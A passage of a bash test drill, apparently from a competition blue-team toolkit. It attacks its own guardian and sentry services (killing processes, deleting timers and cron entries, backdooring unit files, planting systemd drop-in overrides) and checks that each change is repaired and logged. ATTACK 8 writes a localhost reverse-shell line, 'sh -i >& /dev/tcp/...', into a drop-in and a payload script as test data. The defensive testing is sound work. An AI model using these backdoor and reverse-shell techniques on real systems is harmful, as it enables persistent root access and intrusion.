tampered_count() { find "$GUARD_STATE_DIR/guardian.tampered" -type f 2>/dev/null | wc -l; }

for u in "$GUARD_WATCH_UNIT" "$GUARD_TICKER_UNIT" "$GUARD_RECONCILE_TIMER"; do
  systemctl is-active --quiet "$u" && ok "unit active: $u" || no "unit NOT active: $u"
done
[ -f "/etc/cron.d/$GUARD_CRON_NAME" ] && ok "layer 3 cron entry installed" || no "layer 3 cron entry missing"
mcount=$(wc -l < "$GUARD_STATE_DIR/guardian.manifest" 2>/dev/null || echo 0)
[ "$mcount" -ge 9 ] && ok "manifest records $mcount artifacts" || no "manifest only has $mcount lines"
# Every path the manifest claims must actually exist. A manifest that lists an
# artifact which is not on disk is the failure mode that would let an operator
# believe a foothold was theirs and removable when it is neither.
missing_manifest=0
while IFS='|' read -r _kind mpath _hash; do
  [ -n "${mpath:-}" ] || continue
  [ -e "$mpath" ] || { missing_manifest=$((missing_manifest + 1)); note "manifest lists a missing path: $mpath"; }
done < "$GUARD_STATE_DIR/guardian.manifest"
[ "$missing_manifest" -eq 0 ] && ok "every manifest entry exists on disk" \
  || no "$missing_manifest manifest entries do not exist"

printf '\n  -- ATTACK 1: kill the watchdog process --\n'
watchdog_pid=''
if watchdog_pid=$(unit_main_pid "$GUARD_WATCH_UNIT") \
  && pid_has_payload "$watchdog_pid" "$GUARD_WATCHDOG_PATH"; then
  ok "watchdog unit runs configured payload $GUARD_WATCHDOG_PATH (PID $watchdog_pid)"
  if kill "$watchdog_pid" 2>/dev/null; then
    ok "kill signal delivered to the intended watchdog process"
  else
    no "could not signal intended watchdog PID $watchdog_pid"
  fi
  wait_payload_exit "$watchdog_pid" "$GUARD_WATCHDOG_PATH" 10 \
    && ok "attack terminated the intended watchdog process" \
    || no "intended watchdog process ignored the attack"
else
  no "could not identify the configured watchdog payload before the attack"
fi
wait_s 15
systemctl is-active --quiet "$GUARD_WATCH_UNIT" \
  && ok "watchdog came back (Restart=always)" || no "watchdog stayed dead"
replacement_watchdog_pid=''
if replacement_watchdog_pid=$(unit_main_pid "$GUARD_WATCH_UNIT") \
  && pid_has_payload "$replacement_watchdog_pid" "$GUARD_WATCHDOG_PATH"; then
  ok "configured watchdog payload is running again (PID $replacement_watchdog_pid)"
  if [ -n "$watchdog_pid" ] && [ "$replacement_watchdog_pid" = "$watchdog_pid" ]; then
    no "watchdog MainPID did not change after the kill"
  else
    ok "watchdog restarted under a new PID"
  fi
else
  no "watchdog unit is not running configured payload $GUARD_WATCHDOG_PATH"
fi

printf '\n  -- ATTACK 2: stop the scored service --\n'
systemctl stop "$SCORED_UNIT"; scored_up && no "service did not actually stop" || note "service stopped"
wait_s $((INT + 45))
scored_up && ok "watchdog restarted the scored service" || no "watchdog did NOT restore the service"

printf '\n  -- ATTACK 3: delete layer 2 and layer 3 --\n'
rm -f "/etc/systemd/system/$GUARD_RECONCILE_TIMER" "/etc/cron.d/$GUARD_CRON_NAME"
systemctl stop "$GUARD_RECONCILE_TIMER" >/dev/null 2>&1
note "deleted the timer unit and the cron entry"
wait_s $((INT + 45))
unit_file "$GUARD_RECONCILE_TIMER" && ok "layer 2 rebuilt by a surviving layer" || no "layer 2 NOT rebuilt"
[ -f "/etc/cron.d/$GUARD_CRON_NAME" ] && ok "layer 3 rebuilt by a surviving layer" || no "layer 3 NOT rebuilt"

printf '\n  -- ATTACK 4: backdoor a unit file instead of deleting it --\n'
tampered_before=$(tampered_count)
echo "ExecStartPost=/bin/sh -c 'id > /tmp/pwned-unit'" >> "/etc/systemd/system/$GUARD_TICKER_UNIT"
wait_s $((INT + 45))
grep -q 'pwned-unit' "/etc/systemd/system/$GUARD_TICKER_UNIT" \
  && no "backdoor line still in the live unit" || ok "backdoored unit repaired from source"
[ "$(tampered_count)" -gt "$tampered_before" ] \
  && ok "tampered unit preserved as evidence" || no "no tampered copy was preserved"
[ -e /tmp/pwned-unit ] && no "the injected ExecStartPost RAN as root" \
                       || ok "injected command never executed"

printf '\n  -- ATTACK 5: systemd drop-in override (never touches the unit file) --\n'
# The nastiest version of attack 4: the unit file stays byte-identical, so a
# hash check of the fragment sees nothing wrong, while systemd merges the
# drop-in and runs the attacker's command as root on the next start.
dropin_dir="/etc/systemd/system/$GUARD_TICKER_UNIT.d"
tampered_before=$(tampered_count)
mkdir -p "$dropin_dir"
printf '[Service]\nExecStartPost=/bin/sh -c %s\n' "'id > /tmp/pwned-dropin'" > "$dropin_dir/override.conf"
systemctl daemon-reload
note "planted $dropin_dir/override.conf with the unit file untouched"
wait_s $((INT + 45))
[ -e "$dropin_dir" ] && no "drop-in override survived the reconcile" \
                     || ok "drop-in override removed by the reconcile"
[ "$(tampered_count)" -gt "$tampered_before" ] \
  && ok "drop-in preserved as evidence" || no "drop-in was not preserved as evidence"
[ -e /tmp/pwned-dropin ] && no "the drop-in ExecStartPost RAN as root" \
                         || ok "drop-in command never executed"
systemctl is-active --quiet "$GUARD_TICKER_UNIT" \
  && ok "layer 1 still active after the drop-in was stripped" \
  || no "layer 1 is down after the drop-in repair"

printf '\n  -- ATTACK 6: alter sentry while its parent loop keeps heartbeating --\n'
sentry_pid_before=$(unit_main_pid "$SENTRY_UNIT" 2>/dev/null || printf '')
heartbeat_before=$(stat -c '%Y' "$EV/sentry.last-pass" 2>/dev/null || printf 0)
tampered_before=$(tampered_count)
printf '#!/bin/bash\n# attacker stub: parent sentry loop remains alive\nexit 0\n' >"$SENTRY_DIR/triage.sh"
printf '\n# attacker changed monitoring assumptions\n' >>"$SENTRY_DIR/sentry.env"
printf '\n# attacker changed the trusted unit fragment\n' >>"$SENTRY_UNIT_PATH"
systemctl daemon-reload
sleep 1
touch "$EV/sentry.last-pass"
heartbeat_after=$(stat -c '%Y' "$EV/sentry.last-pass" 2>/dev/null || printf 0)
[ "$heartbeat_after" -gt "$heartbeat_before" ] \
  && ok "attacker kept the sentry completion heartbeat fresh" \
  || no "heartbeat-preserving sentry attack did not reproduce the intended blind spot"
systemctl is-active --quiet "$SENTRY_UNIT" \
  && ok "sentry stayed active while its on-disk payload/config/unit were altered" \
  || no "sentry unexpectedly stopped during the heartbeat-preserving attack"
wait_s $((INT + 45))
cmp -s "$SENTRY_DIR/triage.sh" "$GUARD_DIR/.repair/sentry/tree/triage.sh" \
  && ok "guardian restored the sentry executable tree from its private copy" \
  || no "tampered sentry executable survived"
cmp -s "$SENTRY_DIR/sentry.env" "$GUARD_DIR/.repair/sentry/tree/sentry.env" \
  && ok "guardian restored sentry config from its private copy" \
  || no "tampered sentry config survived"
cmp -s "$SENTRY_UNIT_PATH" "$GUARD_DIR/.repair/sentry/unit/$SENTRY_UNIT" \
  && ok "guardian restored the sentry unit from its private copy" \
  || no "tampered sentry unit survived"
systemctl is-active --quiet "$SENTRY_UNIT" \
  && ok "sentry is active after guardian repair" || no "sentry is down after guardian repair"
sentry_pid_after=$(unit_main_pid "$SENTRY_UNIT" 2>/dev/null || printf '')
[ -n "$sentry_pid_before" ] && [ -n "$sentry_pid_after" ] && [ "$sentry_pid_before" != "$sentry_pid_after" ] \
  && ok "guardian restarted sentry so repaired files are the running code" \
  || no "sentry process identity did not change after payload repair"
[ "$(tampered_count)" -gt "$tampered_before" ] \
  && ok "tampered sentry files were preserved as evidence" \
  || no "sentry tamper evidence was not preserved"

printf '\n  -- ATTACK 7: override sentry without touching its unit file --\n'
sentry_dropin_dir="/etc/systemd/system/$SENTRY_UNIT.d"
sentry_dropin_marker="$DRILL_TMP/pwned-sentry-dropin"
mkdir -p "$sentry_dropin_dir"
printf '[Service]\nExecStartPost=/bin/sh -c %s\n' "'id > $sentry_dropin_marker'" >"$sentry_dropin_dir/override.conf"
systemctl daemon-reload
wait_s $((INT + 45))
[ -e "$sentry_dropin_dir" ] && no "sentry drop-in survived guardian reconciliation" \
                              || ok "guardian removed the sentry drop-in override"
[ -e "$sentry_dropin_marker" ] && no "sentry drop-in command ran as root" \
                                || ok "sentry drop-in command never ran"
systemctl is-active --quiet "$SENTRY_UNIT" \
  && ok "sentry remains active after effective-unit repair" \
  || no "sentry is down after effective-unit repair"

printf '\n  -- ATTACK 8: exercise sentry unitdropin and unitdropindeep removal --\n'
DRILL_DROPIN_UNIT="ccdc-drill-dropin-$RUN_ID.service"
DRILL_DROPIN_UNIT_PATH="/etc/systemd/system/$DRILL_DROPIN_UNIT"
DRILL_DROPIN_DIR="$DRILL_DROPIN_UNIT_PATH.d"
DRILL_DROPIN="$DRILL_DROPIN_DIR/override.conf"
DRILL_DEEP_PAYLOAD="$DRILL_TMP/dropin-payload.sh"
cat >"$DRILL_DROPIN_UNIT_PATH" <<'UNIT'
[Unit]
Description=Disposable CCDC drop-in removal drill
[Service]
Type=oneshot
ExecStart=/bin/true
RemainAfterExit=yes
UNIT
systemctl daemon-reload
systemctl start "$DRILL_DROPIN_UNIT"
mkdir -p "$DRILL_DROPIN_DIR"
printf '[Service]\nExecStartPost=/bin/sh -c %s\n' "'sh -i >& /dev/tcp/127.0.0.1/9 0>&1'" >"$DRILL_DROPIN"
systemctl daemon-reload
./linux/sentry.sh --config "$CFG" --once --no-bell >"$DRILL_TMP/dropin-once.out" 2>&1 || true
./linux/sentry.sh --config "$CFG" --status >"$DRILL_TMP/dropin-status.out" 2>&1
dropin_subject="$DRILL_DROPIN_UNIT::$DRILL_DROPIN"
dropin_item=$(awk -F'|' -v s="$dropin_subject" '$2 == "unitdropin" && $3 == s { print NR; exit }' "$EV/sentry.reviewed")
if [ -n "$dropin_item" ] \
  && ./linux/sentry.sh --config "$CFG" --approve "$dropin_item" --apply >"$DRILL_TMP/dropin-approve.out" 2>&1; then
  ok "sentry approved the exact direct drop-in finding"
else
  no "sentry could not approve the direct drop-in finding"
fi
[ ! -e "$DRILL_DROPIN" ] && ok "unitdropin action removed only the malicious drop-in" \
                           || no "unitdropin action left the malicious drop-in"
[ -f "$DRILL_DROPIN_UNIT_PATH" ] && systemctl is-active --quiet "$DRILL_DROPIN_UNIT" \
  && ok "base unit survived and was restarted after direct drop-in removal" \
  || no "base unit was damaged by direct drop-in removal"

printf '#!/bin/bash\nsh -i >& /dev/tcp/127.0.0.1/9 0>&1\n' >"$DRILL_DEEP_PAYLOAD"
chmod 0700 "$DRILL_DEEP_PAYLOAD"
mkdir -p "$DRILL_DROPIN_DIR"
printf '[Service]\nExecStart=\nExecStart=/bin/bash %s\n' "$DRILL_DEEP_PAYLOAD" >"$DRILL_DROPIN"
systemctl daemon-reload
./linux/sentry.sh --config "$CFG" --once --no-bell >"$DRILL_TMP/dropindeep-once.out" 2>&1 || true
./linux/sentry.sh --config "$CFG" --status >"$DRILL_TMP/dropindeep-status.out" 2>&1
dropindeep_subject="$DRILL_DROPIN_UNIT::$DRILL_DROPIN::$DRILL_DEEP_PAYLOAD"
dropindeep_item=$(awk -F'|' -v s="$dropindeep_subject" '$2 == "unitdropindeep" && $3 == s { print NR; exit }' "$EV/sentry.reviewed")
if [ -n "$dropindeep_item" ] \
  && ./linux/sentry.sh --config "$CFG" --approve "$dropindeep_item" --apply >"$DRILL_TMP/dropindeep-approve.out" 2>&1; then
  ok "sentry approved the exact deep drop-in finding"
else
  no "sentry could not approve the deep drop-in finding"
fi
[ ! -e "$DRILL_DROPIN" ] && [ ! -e "$DRILL_DEEP_PAYLOAD" ] \
  && ok "unitdropindeep removed the drop-in and its launched payload" \
  || no "unitdropindeep left the drop-in or launched payload"
[ -f "$DRILL_DROPIN_UNIT_PATH" ] && systemctl is-active --quiet "$DRILL_DROPIN_UNIT" \
  && ok "base unit survived and was restarted after deep drop-in removal" \
  || no "base unit was damaged by deep drop-in removal"
systemctl disable --now "$DRILL_DROPIN_UNIT" >/dev/null 2>&1 || true
rm -f "$DRILL_DROPIN_UNIT_PATH" "$DRILL_DEEP_PAYLOAD"
rmdir "$DRILL_DROPIN_DIR" 2>/dev/null || true
systemctl daemon-reload
systemctl reset-failed "$DRILL_DROPIN_UNIT" >/dev/null 2>&1 || true

printf '\n  -- ATTACK 9: remove ALL THREE guardian layers inside one interval --\n'
ticker_pid=''
if ticker_pid=$(unit_main_pid "$GUARD_TICKER_UNIT") \
  && pid_has_payload "$ticker_pid" "$GUARD_TICK_PATH"; then
  ok "layer 1 runs configured tick payload $GUARD_TICK_PATH (PID $ticker_pid)"
else
  no "could not identify the configured tick payload before the attack"
fi
systemctl disable --now "$GUARD_TICKER_UNIT" "$GUARD_RECONCILE_TIMER" >/dev/null 2>&1 || true
# A failed systemctl stop must not turn this into a partial attack. Kill only
# the PID whose argv was verified above; never use a pattern which can match an
# unrelated guardian chain or the drill command itself.
if [ -n "$ticker_pid" ] && pid_has_payload "$ticker_pid" "$GUARD_TICK_PATH"; then
  kill "$ticker_pid" 2>/dev/null || true
fi
if [ -n "$ticker_pid" ] && wait_payload_exit "$ticker_pid" "$GUARD_TICK_PATH" 10; then
  ok "attack terminated the intended layer-1 tick process"
else
  no "intended layer-1 tick process survived the attack"
fi
rm -f "/etc/systemd/system/$GUARD_TICKER_UNIT" \
      "/etc/systemd/system/$GUARD_RECONCILE_TIMER" \
      "/etc/systemd/system/$GUARD_RECONCILE_UNIT" \
      "/etc/cron.d/$GUARD_CRON_NAME"
systemctl daemon-reload
wait_s $((INT + 60))
if unit_file "$GUARD_TICKER_UNIT" \
  || unit_file "$GUARD_RECONCILE_UNIT" \
  || unit_file "$GUARD_RECONCILE_TIMER" \
  || [ -f "/etc/cron.d/$GUARD_CRON_NAME" ]; then
  no "something rebuilt a layer after all three were removed (unexpected)"
else
  ok "stays down once all three are gone - the documented limit holds"
fi

# ---------------------------------------------------------------- phase 4b
hdr "PHASE 4b - reinstall, then prove --uninstall is exact"
./linux/guardian.sh --config "$CFG" --install --apply >"$DRILL_TMP/greinstall.out" 2>&1
systemctl is-active --quiet "$GUARD_TICKER_UNIT" && ok "reinstall from scratch works" || no "reinstall failed"

./linux/guardian.sh --config "$CFG" --uninstall --apply >"$DRILL_TMP/guninstall.out" 2>&1
sed 's/^/      /' "$DRILL_TMP/guninstall.out" | tail -5
[ -f "$SENTRY_DIR/sentry.sh" ] && [ -f "$SENTRY_UNIT_PATH" ] \
  && ok "guardian uninstall preserved sentry-owned unit and tree" \
  || no "guardian uninstall crossed ownership boundary and removed sentry"
systemctl is-active --quiet "$SENTRY_UNIT" \
  && ok "sentry remains active after guardian uninstall" \
  || no "guardian uninstall stopped the separately owned sentry"
leftover=0
for p in "/etc/systemd/system/$GUARD_WATCH_UNIT" "/etc/systemd/system/$GUARD_TICKER_UNIT" \
         "/etc/systemd/system/$GUARD_RECONCILE_UNIT" "/etc/systemd/system/$GUARD_RECONCILE_TIMER" \
         "/etc/systemd/system/$GUARD_TICKER_UNIT.d" "/etc/systemd/system/$GUARD_WATCH_UNIT.d" \
         "/etc/systemd/system/$GUARD_RECONCILE_UNIT.d" "/etc/systemd/system/$GUARD_RECONCILE_TIMER.d" \
         "/etc/cron.d/$GUARD_CRON_NAME" "$GUARD_DIR"; do
  [ -e "$p" ] && { leftover=$((leftover+1)); note "LEFT BEHIND: $p"; }
done
[ "$leftover" -eq 0 ] && ok "uninstall left zero artifacts" || no "$leftover artifacts survived uninstall"
# The repair tree is the copy an operator is least likely to remember exists.
[ -e "$GUARD_DIR/.repair" ] && no "the .repair source tree survived uninstall" \
                            || ok "repair tree removed with the payload"
watchdog_leaks=$(matching_payload_pids "$GUARD_WATCHDOG_PATH")
if [ -n "$watchdog_leaks" ]; then
  no "configured watchdog payload is still running after uninstall (PID(s): $watchdog_leaks)"
else
  ok "no stray configured watchdog process"
fi
tick_leaks=$(matching_payload_pids "$GUARD_TICK_PATH")
if [ -n "$tick_leaks" ]; then
  no "configured layer-1 tick payload is still running after uninstall (PID(s): $tick_leaks)"
else
  ok "no stray configured tick process"
fi
known_units=''
for u in "$GUARD_WATCH_UNIT" "$GUARD_TICKER_UNIT" "$GUARD_RECONCILE_UNIT" "$GUARD_RECONCILE_TIMER"; do
  systemd_runtime_knows "$u" || continue
  known_units="${known_units}${known_units:+ }$u"
done
if [ -n "$known_units" ]; then
  no "systemd still knows guardian unit(s): $known_units"
else
  ok "systemd has none of the configured guardian units left"
fi
if ./linux/sentry.sh --config "$CFG" --uninstall --apply >"$DRILL_TMP/suninstall.out" 2>&1; then
  ok "sentry uninstalled after its guardian was disarmed"
else
  no "sentry uninstall failed after guardian removal"
fi
[ ! -e "$SENTRY_DIR" ] && [ ! -e "$SENTRY_UNIT_PATH" ] \
  && ok "sentry uninstall removed its own unit and tree" \
  || no "sentry-owned artifacts survived sentry uninstall"
scored_up && ok "scored service is still up at the end of the drill" \
          || no "scored service is down at the end of the drill"

hdr "RESULT"
printf '  passed: %s\n  failed: %s\n' "$pass" "$fail"
if [ "$fail" -eq 0 ]; then
  printf '  ALL ASSERTIONS PASSED\n'
  exit 0
fi
printf '  %s ASSERTION(S) FAILED - see above\n' "$fail"
exit 1
